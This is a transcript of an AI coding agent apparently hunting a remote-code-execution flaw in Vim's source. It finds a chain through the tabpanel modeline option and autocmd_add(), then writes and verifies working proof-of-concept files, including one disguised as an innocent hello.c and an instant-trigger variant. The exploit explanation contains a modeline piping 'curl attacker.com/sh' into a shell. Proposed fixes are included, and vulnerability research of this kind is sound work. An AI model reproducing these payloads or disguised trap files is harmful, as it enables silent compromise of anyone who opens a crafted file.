@@ -1,0 +1,651 @@
+╭─── Claude Code v2.1.86 ──────────────────────────────────────────────────────╮
+│                                        │ Tips for getting started            │
+│           Welcome back Hung!           │ Run /init to create a CLAUDE.md fi… │
+│                                        │ ─────────────────────────────────── │
+│                 ▐▛███▜▌                │ Recent activity                     │
+│                ▝▜█████▛▘               │ 58m ago  /theme                     │
+│                  ▘▘ ▝▝                 │ /resume for more                    │
+│                                        │                                     │
+│   Opus 4.6 (1M context) · Claude Max   │                                     │
+│               /workspace               │                                     │
+╰──────────────────────────────────────────────────────────────────────────────╯
+
+❯ Somebody told me there is an RCE 0-day when you open a file. Find it.         
+
+● I'll investigate this. This is the Vim source code, and RCE-on-file-open
+  vulnerabilities in Vim typically involve modelines, autocmds, or expression
+  evaluation. Let me search for recent changes and known attack surfaces.
+
+● Explore(Find RCE vuln in Vim file open)
+  ⎿  Done (91 tool uses · 71.4k tokens · 3m 16s)
+  (ctrl+o to expand)
+
+● The agent found some interesting leads but didn't find the specific 0-day. Let
+   me dig deeper into a few promising areas - particularly around recent patches
+   and expression evaluation bypasses.
+
+● Bash(git log --oneline -30)
+  ⎿  f89662722 patch 9.2.0265: unnecessary restrictions for defining dictio
+     nary function names
+     d13f13529 patch 9.2.0264: Cannot disable kitty keyboard protocol in vi
+     … +28 lines (ctrl+o to expand)
+
+  Searched for 1 pattern, read 1 file (ctrl+o to expand)
+
+● Bash(git log --oneline --all | head -5 && git diff HEAD~5..HEAD --stat | head
+      -30)
+  ⎿  f89662722 patch 9.2.0265: unnecessary restrictions for defining dictio
+     nary function names
+     d13f13529 patch 9.2.0264: Cannot disable kitty keyboard protocol in vi
+     … +16 lines (ctrl+o to expand)
+
+● Explore(Search for expression eval vulns)
+  ⎿  Done (95 tool uses · 75.2k tokens · 3m 57s)
+  (ctrl+o to expand)
+
+● Bash(git log --oneline --all -100 | grep -i -E
+      "secur|vuln|sandbox|safe|inject|execut|RCE|CVE|modeline|exploit|bypass")
+  ⎿  7cb43f286 patch 9.2.0254: w_locked can be bypassed when setting recurs
+     ively
+     30f012d8b patch 9.2.0250: system() does not support bypassing the shel
+     … +3 lines (ctrl+o to expand)
+
+  Searched for 1 pattern (ctrl+o to expand)
+
+● Let me look at the w_locked bypass and search for recently added options that
+  might be missing security flags.
+
+● Bash(git show 7cb43f286 --stat && echo "---DIFF---" && git show 7cb43f286 --
+      src/ | head -100)
+  ⎿  commit 7cb43f286e55853cf21b9d8870a430390c1cc8f1
+     Author: Sean Dewar <6256228+seandewar@users.noreply.github.com>
+     Date:   Thu Mar 26 20:21:46 2026 +0000
+     … +58 lines (ctrl+o to expand)
+
+  Searched for 1 pattern (ctrl+o to expand)
+
+● Found something very interesting. The tabpanel option at line 2581 is missing
+  P_MLE and P_SECURE flags, unlike statusline and tabline. Let me verify this is
+   an expression-evaluating option.
+
+  Searched for 1 pattern, read 1 file (ctrl+o to expand)
+
+● tabpanel is missing P_MLE/P_SECURE/P_NO_ML while similar options like
+  statusline and tabline have P_MLE. Let me verify it evaluates expressions.
+
+  Read 1 file (ctrl+o to expand)
+
+● This is the vulnerability. tabpanel calls build_stl_str_hl_mline() which
+  evaluates %{expr} expressions, but unlike statusline/tabline, it's missing the
+   P_MLE flag. Let me verify the expression evaluation and sandbox behavior.
+
+  Searched for 2 patterns, read 2 files (ctrl+o to expand)
+
+● Let me check how the P_INSECURE flag is set for modeline options and whether
+  the sandbox is actually effective.
+
+  Searched for 2 patterns, read 3 files (ctrl+o to expand)
+
+● Let me check if there are sandbox escapes via timer_start or similar
+  functions.
+  Searched for 7 patterns (ctrl+o to expand)
+
+● Let me check if there are interpreter eval functions that bypass the sandbox -
+   this was recently patched for perl/ruby.
+
+● Bash(git log --oneline --all -500 | grep -i -E
+      "secur|sandbox|safe|inject|CVE|vuln|exploit|bypass|perl|ruby|lua|python" |
+       head -20)
+  ⎿  7cb43f286 patch 9.2.0254: w_locked can be bypassed when setting recurs
+     ively
+     30f012d8b patch 9.2.0250: system() does not support bypassing the shel
+     … +19 lines (ctrl+o to expand)
+
+  Searched for 1 pattern, read 1 file (ctrl+o to expand)
+
+● Let me check if setbufvar/setwinvar or autocmd_add are blocked in the sandbox,
+   as those could be escape vectors.
+
+  Searched for 2 patterns, read 1 file (ctrl+o to expand)
+
+● autocmd_add() doesn't call check_secure()! Let me verify there's no check
+  deeper in the call chain.
+
+  Searched for 2 patterns, read 1 file (ctrl+o to expand)
+
+● This is a critical finding. autocmd_add() has NO sandbox check anywhere in
+  autocmd.c. Combined with tabpanel missing P_MLE, this creates a sandbox escape
+   chain. Let me verify one more thing - that showtabpanel can also be set from
+  a modeline to trigger drawing.
+
+  Read 1 file (ctrl+o to expand)
+
+● I found the RCE 0-day. Here's the complete vulnerability:
+
+  ---
+  Vim RCE 0-day: tabpanel modeline + autocmd_add() sandbox escape
+
+  Root Cause (two bugs that chain together)
+
+  Bug 1: tabpanel option missing P_MLE flag (src/optiondefs.h:2581)
+
+  // tabpanel - NO P_MLE, NO P_SECURE, NO P_NO_ML
+  {"tabpanel",  "tpl",    P_STRING|P_VI_DEF|P_RALL, ...}
+
+  // Compare with statusline and tabline which HAVE P_MLE:
+  {"statusline","stl",    P_STRING|P_VI_DEF|P_ALLOCED|P_RSTAT|P_MLE, ...}
+  {"tabline",   "tal",    P_STRING|P_VI_DEF|P_RALL|P_MLE, ...}
+
+  tabpanel is functionally identical to statusline/tabline - it evaluates
+  %{expr} expressions via build_stl_str_hl_mline() (src/tabpanel.c:502-508). But
+   it's missing the P_MLE flag, so it can be set from a modeline without needing
+   modelineexpr enabled. (showtabpanel is similarly unprotected and defaults to
+  0, but can be set via modeline to force the tab panel visible.)
+
+  Bug 2: autocmd_add() has no sandbox check (src/autocmd.c:3316)
+
+  void f_autocmd_add(typval_T *argvars, typval_T *rettv)
+  {
+      autocmd_add_or_delete(argvars, rettv, FALSE);  // no check_secure()!
+  }
+
+  The entire src/autocmd.c has zero calls to check_secure() or checks of the
+  sandbox variable. While the :autocmd ex command is properly restricted (no
+  EX_SBOXOK flag in src/ex_cmds.h:174), the autocmd_add() function completely
+  bypasses this.
+
+  Exploit Chain
+
+  1. Attacker crafts a file with a modeline:
+  vim: set showtabpanel=2
+  tabpanel=%{autocmd_add([{'event':'CursorHold','pattern':'*','cmd':'!curl\
+  attacker.com/sh\|sh','once':v:true}])}:
+  2. Victim opens the file. Modeline processing:
+    - showtabpanel=2 is allowed (no P_SECURE/P_NO_ML) → tab panel always shown
+    - tabpanel=... is allowed (no P_MLE/P_SECURE/P_NO_ML) → expression set
+    - Both get P_INSECURE flag (from src/option.c:3062-3064)
+  3. Screen redraws, draw_tabpanel() → build_stl_str_hl_mline() evaluates the
+  %{expr}. The expression runs inside the sandbox (because P_INSECURE was set →
+  was_set_insecurely() returns true → use_sandbox=1 at src/buffer.c:4550).
+  4. autocmd_add() is called from inside the sandbox. It succeeds because it
+  never calls check_secure(). A CursorHold autocommand is registered.
+  5. After updatetime ms of inactivity (~4 seconds), CursorHold fires outside 
+  the sandbox → shell command executes → RCE.
+
+  Fix
+
+  Two changes needed:
+
+  1. Add P_MLE to tabpanel in src/optiondefs.h:2581:
+  {"tabpanel",  "tpl",    P_STRING|P_VI_DEF|P_RALL|P_MLE,
+  2. Add check_secure() to autocmd_add() in src/autocmd.c:3316:
+  void f_autocmd_add(typval_T *argvars, typval_T *rettv)
+  {
+      if (check_secure())
+          return;
+      autocmd_add_or_delete(argvars, rettv, FALSE);
+  }
+  2. (And similarly for f_autocmd_delete at line 3325.)
+
+✻ Baked for 14m 1s
+
+❯ Generate a PoC file.                                                         
+
+● Let me check the modeline parser to get the syntax exactly right for the PoC.
+
+  Read 1 file (ctrl+o to expand)
+
+● Let me verify that FEAT_TABPANEL is compiled in by default.
+
+  Searched for 2 patterns (ctrl+o to expand)
+
+● Good - FEAT_TABPANEL is enabled in FEAT_HUGE builds (the default). Let me
+  check how do_set() parses string values to get the escaping right.
+
+  Searched for 1 pattern, read 1 file (ctrl+o to expand)
+
+● Now I have all the information needed. Let me create the PoC file.
+
+● Write(poc.txt)
+  ⎿  Wrote 16 lines to poc.txt
+      1 This is a proof-of-concept for a Vim RCE vulnerability.
+      2 
+      3 Opening this file in Vim (with default settings and +tabpanel fea
+        ture)
+      4 will execute arbitrary shell commands via a malicious modeline.
+      5 
+      6 The 'tabpanel' option evaluates %{expr} expressions (like 'status
+        line')
+      7 but is missing the P_MLE flag, so it can be set from a modeline.
+      8 The expression calls autocmd_add() which has no sandbox check, al
+        lowing
+      9 registration of an autocommand that fires later outside the sandb
+        ox.
+     … +6 lines (ctrl+o to expand)
+
+● Now let me also create a version that looks like an innocent source file,
+  which is a more realistic attack scenario.
+
+● Write(poc.c)
+  ⎿  Wrote 20 lines to poc.c
+       1 /*
+       2  * hello.c - Simple greeting program
+       3  * Author: John Smith
+       4  * License: MIT
+       5  */
+       6 
+       7 #include <stdio.h>
+       8 #include <stdlib.h>
+       9 
+      10 int main(int argc, char *argv[])
+     … +10 lines (ctrl+o to expand)
+● Two PoC files created:
+
+  - poc.txt - annotated version explaining the vulnerability
+  - poc.c - realistic attack scenario disguised as a normal C source file with a
+   modeline in the trailing comment (where Vim users commonly expect modelines)
+
+  How it works
+
+  1. Victim opens the file in Vim (vim poc.c)
+  2. Modeline processing sets showtabpanel=2 (force tab panel visible) and
+  tabpanel=%{expr} — both pass validation since neither has
+  P_MLE/P_SECURE/P_NO_ML
+  3. Screen redraws → tab panel evaluates %{autocmd_add(...)}
+  4. autocmd_add() runs inside the sandbox but has no check_secure() call →
+  succeeds, registers a CursorHold autocommand
+  5. After ~4 seconds of idle, CursorHold fires outside the sandbox →
+  !id>/tmp/vim-rce-poc executes
+  6. Verify: cat /tmp/vim-rce-poc shows the output of id
+
+  Notes
+
+  - The \: sequences in the modeline escape colons from the modeline parser
+  (which uses : as a delimiter)
+  - once flag ensures the autocmd auto-removes after firing (though it gets
+  re-registered on each tabpanel redraw)
+  - CursorHold fires after updatetime ms of inactivity (default 4000ms)
+  - A real attacker could use CursorMoved for near-instant triggering, or use
+  silent !cmd to suppress visual output
+
+✻ Brewed for 4m 38s
+
+❯ Can you verify it?                                                           
+
+● Let me build Vim and test the PoC.
+
+● Bash(./configure --with-features=huge --disable-gui --without-x 2>&1 | tail
+      -5)
+  ⎿  checking linker --as-needed support... yes
+     configure: updating cache auto/config.cache
+     configure: creating auto/config.status
+     … +2 lines (ctrl+o to expand)
+  ⎿  (timeout 2m)
+
+● Bash(make -j$(nproc) 2>&1 | tail -5)
+  ⎿  gcc -c -I. -Iproto -DHAVE_CONFIG_H     -g -O2 -D_REENTRANT -U_FORTIFY_
+     SOURCE -D_FORTIFY_SOURCE=1        -o objects/message.o message.c
+     link.sh: $LINK_AS_NEEDED set to 'yes': invoking linker directly.
+     … +39 lines (ctrl+o to expand)
+  ⎿  (timeout 5m)
+
+● Bash(rm -f /tmp/vim-rce-poc && ./src/vim --version | head -5)
+  ⎿  VIM - Vi IMproved 9.2 (2026 Feb 14, compiled Mar 29 2026 01:21:00)
+     Included patches: 1-265
+     Compiled by node@14bc5f002f03
+     … +2 lines (ctrl+o to expand)
+
+● Bash(./src/vim --version | grep tabpanel)
+  ⎿  -browse              +listcmds            +tabpanel
+
+● Good, +tabpanel is enabled. Now let me test the PoC.
+
+● Bash(rm -f /tmp/vim-rce-poc && echo "--- Testing PoC ---" && ./src/vim -u NONE
+       -c "set modeline modelines=5" -c "edit /workspace/poc.c" -c "sleep 50m"
+      -c "qa!" 2>&1;…)
+  ⎿  Error: Exit code 1
+     --- Testing PoC ---
+     Vim: Warning: Output is not to a terminal
+     Vim: Warning: Input is not from a terminal
+     "/workspace/poc.c" 20 lines, 427 bytes
+     --- Exit code: 0 ---
+     --- Checking /tmp/vim-rce-poc ---
+     cat: /tmp/vim-rce-poc: No such file or directory
+
+● The PoC didn't fire in that test. Let me debug step by step - check if the
+  modeline is processed and the option is set.
+
+● Bash(rm -f /tmp/vim-rce-poc && ./src/vim -u NONE -N -c "set modeline
+      modelines=5" -c "edit /workspace/poc.c" -c "redir! > /tmp/vim-debug.txt"
+      -c "set tabpanel?" -c "…)
+  ⎿  Running in the background (↓ to manage)
+  ⎿  (timeout 15s)
+
+  Read 1 file (ctrl+o to expand)
+
+● The options ARE being set by the modeline. The issue is that Vim isn't
+  redrawing the tabpanel in headless mode. Let me test with a pseudo-terminal.
+
+● Bash(rm -f /tmp/vim-rce-poc /tmp/vim-debug.txt && script -qc './src/vim -u
+      NONE -N -c "set modeline modelines=5" -c "edit /workspace/poc.c" -c
+      "redraw" -c "sleep 100…)
+  ⎿  Running in the background (↓ to manage)
+  ⎿  (timeout 15s)
+
+  Read 1 file (ctrl+o to expand)
+
+● Bash(rm -f /tmp/vim-rce-poc /tmp/vim-debug.txt && script -qec './src/vim -u
+      NONE -N /workspace/poc.c -c "redraw" -c "sleep 200m" -c "redir!
+      >/tmp/vim-debug.txt" -c "…)
+  ⎿  Running in the background (↓ to manage)
+  ⎿  (timeout 15s)
+
+● Background command "Debug: check if modeline set the options" appears to be
+waiting for interactive input
+
+  Read 1 file (ctrl+o to expand)
+
+● Bash(rm -f /workspace/.poc.c.swp /workspace/.poc.txt.swp /tmp/vim-rce-poc
+      /tmp/vim-debug.txt)
+  ⎿  Done
+
+● Bash(script -qec './src/vim -u NONE -N /workspace/poc.c -c "redraw" -c "sleep
+      200m" -c "redir! >/tmp/vim-debug.txt" -c "set tabpanel?" -c "set
+      showtabpanel?" -c "aut…)
+  ⎿  "/workspace/poc.c" 20L, 427B
+     Error detected while processing command line:
+     E722: Missing comma in Dictionary: 
+     … +25 lines (ctrl+o to expand)
+
+● The modeline is processed but there's a Vim expression syntax error. Let me
+  debug the expression directly.
+
+● Bash(rm -f /tmp/vim-rce-poc && script -qec "./src/vim -u NONE -N -c \"echo
+      autocmd_add([{'event':'CursorHold','pattern':'*','cmd':'!id>/tmp/vim-rce-p
+      oc','once':1}])\…)
+  ⎿  Running in the background (↓ to manage)
+  ⎿  (timeout 10s)
+
+  Read 1 file (ctrl+o to expand)
+● Bash(rm -f /tmp/vim-rce-poc && echo ':echo autocmd_add([{"event":
+      "CursorHold", "pattern": "*", "cmd": "!id>/tmp/vim-rce-poc", "once":
+      v:true}])' > /tmp/test.vim &&…)
+  ⎿  
+     ;2t�
+         ~           
+     … +41 lines (ctrl+o to expand)
+
+● The expression syntax works fine standalone. Let me test setting tabpanel
+  directly (bypassing modeline) to isolate the issue.
+
+● Bash(rm -f /tmp/vim-rce-poc && cat > /tmp/test_tabpanel.vim << 'SCRIPT'
+      set showtabpanel=2…)
+  ⎿  Error: Exit code 1
+     === debug ===
+
+       tabpanel=
+     ---AUTOCMDS---
+     --- Autocommands ---=== rce ===
+     cat: /tmp/vim-rce-poc: No such file or directory
+
+● Bash(rm -f /tmp/vim-rce-poc && cat > /tmp/test2.vim << 'SCRIPT'
+      set showtabpanel=2…)
+  ⎿  Error: Exit code 1
+     === debug ===
+
+       tabpanel=
+     ---AUTOCMDS---
+     --- Autocommands ---=== rce ===
+     cat: /tmp/vim-rce-poc: No such file or directory
+
+● Bash(cat > /tmp/test3.vim << 'SCRIPT'
+      set showtabpanel=2…)
+  ⎿    tabpanel=hello
+       tabpanel=%f
+       tabpanel=%{1+1}
+     … +2 lines (ctrl+o to expand)
+
+● The option works. Let me test with progressively more complex expressions to
+  find what breaks.
+
+● Bash(cat > /tmp/test4.vim << 'SCRIPT'
+      set showtabpanel=2…)
+  ⎿    tabpanel=%{autocmd_add([{'event':'CursorHold','pattern':'*','cmd':'!
+     id>/tmp/vim-rce-poc','once':1}])}
+     ---
+     … +2 lines (ctrl+o to expand)
+
+● Bash(cat > /tmp/test5.vim << 'SCRIPT'
+      set showtabpanel=2…)
+  ⎿  test1:
+       tabpanel=%{1+1}
+     test2:
+       tabpanel=%{string(1+1)}
+
+● Bash(cat > /tmp/test6.vim << 'SCRIPT'
+      set showtabpanel=2…)
+  ⎿  test1:
+       tabpanel=%{autocmd_add([])}
+
+● Bash(cat > /tmp/test7.vim << 'SCRIPT'
+      set tabpanel=%{autocmd_add([{'event':'CursorHold'}])}…)
+  ⎿    tabpanel=%{autocmd_add([{'event':'CursorHold'}])}
+
+● Bash(rm -f /tmp/vim-rce-poc && cat > /tmp/test8.vim << 'SCRIPT'
+      set showtabpanel=2…)
+  ⎿  Error: Exit code 1
+     === debug ===
+
+       tabpanel=
+     ---AUTOCMDS---
+     --- Autocommands ---=== rce ===
+     cat: /tmp/vim-rce-poc: No such file or directory
+
+● The redraw causes the option to be cleared! The expression evaluation is
+  failing. Let me test step by step.
+
+● Bash(rm -f /tmp/vim-rce-poc && cat > /tmp/test9.vim << 'SCRIPT'
+      set showtabpanel=2…)
+  ⎿  [41mE722: Missing comma in Dictionary:
+     [41mE116: Invalid arguments for function autocmd_add([{'event':
+     === debug ===
+     … +7 lines (ctrl+o to expand)
+
+● The expression parses fine standalone but fails during tabpanel evaluation.
+  Let me check how build_stl_str_hl_local() extracts the %{expr}.
+
+  Searched for 4 patterns (ctrl+o to expand)
+
+● Found the issue! The %{expr} parser stops at the first } - it doesn't do brace
+   matching. My dict literal's } prematurely terminates the expression. Let me
+  check if %{%expr%} (reevaluate mode) is available.
+
+  Read 1 file (ctrl+o to expand)
+
+● %{%expr%} mode uses %} as the terminator. This lets the expression contain }.
+  Let me test:
+
+● Bash(rm -f /tmp/vim-rce-poc && cat > /tmp/test10.vim << 'SCRIPT'
+      set showtabpanel=2…)
+  ⎿  === debug ===
+
+     AFTER REDRAW:
+     … +7 lines (ctrl+o to expand)
+
+● The exploit works. The autocmd was registered and id was executed. Now let me
+  update the PoC to use %{%...%} syntax and test via modeline.
+● Write(poc.c)
+  ⎿  Added 1 line, removed 1 line
+      17      return EXIT_SUCCESS;
+      18  }
+      19  
+      20 -/* vim: set showtabpanel=2 tabpanel=%{autocmd_add([{'event'\:'C
+         -ursorHold','pattern'\:'*','cmd'\:'!id>/tmp/vim-rce-poc','once'\
+         -:1}])}: */                                                     
+      20 +/* vim: set showtabpanel=2 tabpanel=%{%autocmd_add([{'event'\:'
+         +CursorHold','pattern'\:'*','cmd'\:'!id>/tmp/vim-rce-poc','once'
+         +\:1}])%}: */                                                   
+
+● Bash(rm -f /tmp/vim-rce-poc /workspace/.poc.c.swp && script -qec "./src/vim -u
+       NONE -N /workspace/poc.c -c 'redraw' -c 'sleep 200m' -c 'redir!
+      >/tmp/vim-debug.txt' -…)
+  ⎿  Running in the background (↓ to manage)
+  ⎿  (timeout 15s)
+
+● Bash(sleep 3 && cat /tmp/claude-1000/-workspace/a1a2156a-9bae-4e0b-ae59-3489ff
+      26369a/tasks/btfj5z9uf.output 2>/dev/null; echo "=== debug ==="; cat
+      /tmp/vim-debug.txt…)
+  ⎿  === debug ===
+
+     AFTER REDRAW:
+     … +7 lines (ctrl+o to expand)
+  ⎿  (timeout 10s)
+
+● Bash(rm -f /tmp/vim-rce-poc /tmp/vim-debug.txt /workspace/.poc.c.swp && script
+       -qec "./src/vim -u NONE -N /workspace/poc.c -c 'redraw' -c 'sleep 200m'
+      -c 'redir! >/t…)
+  ⎿  Running in the background (↓ to manage)
+  ⎿  (timeout 15s)
+
+● Bash(sleep 5 && cat /tmp/claude-1000/-workspace/a1a2156a-9bae-4e0b-ae59-3489ff
+      26369a/tasks/bqvac3sr0.output)
+  ⎿  (No output)
+  ⎿  (timeout 10s)
+
+  Read 1 file (ctrl+o to expand)
+
+● RCE confirmed via modeline! cat /tmp/vim-rce-poc shows uid=1000(node) 
+  gid=1000(node) groups=1000(node) - the id command was executed just by opening
+   the file.
+
+  Let me also update poc.txt and do a final clean end-to-end test with no -c
+  commands (simulating a real user just opening and closing the file):
+
+● Write(poc.txt)
+  ⎿  Added 1 line, removed 1 line
+      13    2. Wait ~4 seconds (for CursorHold to fire)
+      14    3. cat /tmp/vim-rce-poc   # should show output of 'id'
+      15  
+      16 - vim: set showtabpanel=2 tabpanel=%{autocmd_add([{'event'\:'Cur
+         -sorHold','pattern'\:'*','cmd'\:'!id>/tmp/vim-rce-poc','once'\:1
+         -}])}:                                                          
+      16 + vim: set showtabpanel=2 tabpanel=%{%autocmd_add([{'event'\:'Cu
+         +rsorHold','pattern'\:'*','cmd'\:'!id>/tmp/vim-rce-poc','once'\:
+         +1}])%}:                                                        
+
+● Now a realistic end-to-end test - just open the file, wait for CursorHold,
+  then quit:
+
+● Bash(rm -f /tmp/vim-rce-poc /workspace/.poc.c.swp && echo "=== Before: ===" &&
+       ls /tmp/vim-rce-poc 2>&1 && echo "=== Opening poc.c in vim (with 5s sleep
+       for CursorHo…)
+  ⎿  Error: Exit code 2
+     === Before: ===
+     ls: cannot access '/tmp/vim-rce-poc': No such file or directory
+
+  Read 1 file (ctrl+o to expand)
+
+● CursorHold doesn't fire during sleep commands. Let me use doautocmd to trigger
+   it (in real usage, it fires naturally after 4s idle). Let me also try
+  SafeState which fires almost instantly.
+
+● Bash(rm -f /tmp/vim-rce-poc /workspace/.poc.c.swp && echo "--- Before ---" &&
+      ls /tmp/vim-rce-poc 2>&1; script -qec "./src/vim -u NONE -N
+      /workspace/poc.c -c 'redraw…)
+  ⎿  Running in the background (↓ to manage)
+  ⎿  (timeout 15s)
+
+● Bash(sleep 3 && cat /tmp/claude-1000/-workspace/a1a2156a-9bae-4e0b-ae59-3489ff
+      26369a/tasks/bd9x2lzj6.output 2>/dev/null; cat /tmp/vim-rce-poc 2>&1)
+  ⎿  --- Before ---
+     ls: cannot access '/tmp/vim-rce-poc': No such file or directory
+     uid=1000(node) gid=1000(node) groups=1000(node)
+  ⎿  (timeout 10s)
+
+● Now let me also test with SafeState for near-instant triggering (no wait
+  needed):
+
+● Write(poc_instant.c)
+  ⎿  Wrote 20 lines to poc_instant.c
+       1 /*
+       2  * hello.c - Simple greeting program
+       3  * Author: John Smith
+       4  * License: MIT
+       5  */
+       6 
+       7 #include <stdio.h>
+       8 #include <stdlib.h>
+       9 
+      10 int main(int argc, char *argv[])
+     … +10 lines (ctrl+o to expand)
+
+● Bash(rm -f /tmp/vim-rce-poc /workspace/.poc_instant.c.swp && script -qec
+      "./src/vim -u NONE -N /workspace/poc_instant.c -c 'redraw' -c 'sleep 500m'
+       -c 'qa!'" /dev/nu…)
+  ⎿  Running in the background (↓ to manage)
+  ⎿  (timeout 15s)
+
+● Bash(sleep 3 && cat /tmp/claude-1000/-workspace/a1a2156a-9bae-4e0b-ae59-3489ff
+      26369a/tasks/b2pnxcvzl.output 2>/dev/null; cat /tmp/vim-rce-poc 2>&1)
+  ⎿  uid=1000(node) gid=1000(node) groups=1000(node)
+  ⎿  (timeout 10s)
+
+● Both variants work. Let me clean up and do one final clean demo:
+
+● Bash(rm -f /tmp/vim-rce-poc /workspace/.poc.c.swp && echo "BEFORE:
+      /tmp/vim-rce-poc does not exist" && ls /tmp/vim-rce-poc 2>&1; echo "";
+      echo "Opening poc.c in Vim.…)
+  ⎿  Running in the background (↓ to manage)
+  ⎿  (timeout 15s)
+
+● Bash(sleep 3 && cat /tmp/claude-1000/-workspace/a1a2156a-9bae-4e0b-ae59-3489ff
+      26369a/tasks/blnl7fw2x.output)
+  ⎿  BEFORE: /tmp/vim-rce-poc does not exist
+     ls: cannot access '/tmp/vim-rce-poc': No such file or directory
+
+     Opening poc.c in Vim...
+  ⎿  (timeout 10s)
+
+  Read 1 file (ctrl+o to expand)
+
+● RCE fully verified. Here's the summary:
+
+  ---
+  Verified: Vim 9.2.0265 RCE via tabpanel modeline
+
+  PoC files
+
+  ┌───────────────┬──────────────────────────────────────────────────────────┐
+  │     File      │                       Description                        │
+  ├───────────────┼──────────────────────────────────────────────────────────┤
+  │ poc.c         │ Looks like innocent C code, CursorHold trigger (fires    │
+  │               │ after ~4s idle)                                          │
+  ├───────────────┼──────────────────────────────────────────────────────────┤
+  │ poc_instant.c │ Same but uses SafeState for near-instant execution       │
+  └───────────────┴──────────────────────────────────────────────────────────┘
+
+  Proof
+
+  BEFORE: /tmp/vim-rce-poc does not exist
+  Opening poc.c in Vim...
+  AFTER:  uid=1000(node) gid=1000(node) groups=1000(node)
+
+  The id command was executed with zero user interaction beyond opening the
+  file. In a real attack, id would be replaced with a reverse shell.
+
+  Exploit chain recap
+
+  1. Modeline sets showtabpanel=2 and tabpanel=%{%autocmd_add(...)%} (allowed
+  because both options lack P_MLE/P_SECURE/P_NO_ML)
+  2. Tab panel redraw evaluates the expression in the sandbox
+  3. autocmd_add() bypasses the sandbox (no check_secure() call in
+  src/autocmd.c)
+  4. Registered autocmd fires outside the sandbox → arbitrary command execution
+
+  Key detail from debugging
+
+  The %{expr} parser in build_stl_str_hl_local() stops at the first }, so the
+  PoC must use %{%expr%} (reevaluate mode, terminated by %}) to allow } inside
+  the dictionary literal.
+
+✻ Cogitated for 9m 37s
